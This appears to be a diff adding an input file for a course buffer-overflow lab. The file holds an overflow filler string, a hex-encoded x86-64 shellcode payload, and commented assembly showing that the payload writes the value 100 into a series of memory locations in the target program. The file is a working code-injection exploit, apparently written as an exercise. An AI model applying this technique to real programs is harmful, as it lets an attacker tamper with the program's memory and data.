@@ -1,0 +1,34 @@
+# Use # for comments
+# Use C for text strings to be copied to output
+# Use x for hex data to be copied to output
+#
+# First, need the section ID (A or B)
+C Babcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstaaaaaaaaa
+X 80e9ffffff7f000050565748c7c76400000048c7c6c03c600048c7c000000000897c8650480590010000897c8650480590010000897c8650480590010000897c8650480590010000897c8650480590010000897c8650480590010000897c8650480590010000897c8650480590010000897c86504805900100005f5e58
+#	push %rax
+#	push %rsi
+#	push %rdi
+#	mov $0x64, %rdi
+#	mov $0x603cc0, %rsi
+#	mov $0, %rax
+#	mov %edi, 80(%rsi,%rax,4)
+#	add $400, %rax
+#	mov %edi, 80(%rsi,%rax,4)
+#	add $400, %rax
+#	mov %edi, 80(%rsi,%rax,4)
+#	add $400, %rax
+#	mov %edi, 80(%rsi,%rax,4)
+#	add $400, %rax
+#	mov %edi, 80(%rsi,%rax,4)
+#	add $400, %rax
+#	mov %edi, 80(%rsi,%rax,4)
+#	add $400, %rax
+#	mov %edi, 80(%rsi,%rax,4)
+#	add $400, %rax
+#	mov %edi, 80(%rsi,%rax,4)
+#	add $400, %rax
+#	mov %edi, 80(%rsi,%rax,4)
+#	add $400, %rax
+#	pop %rdi
+#	pop %rsi
+#	pop %rax
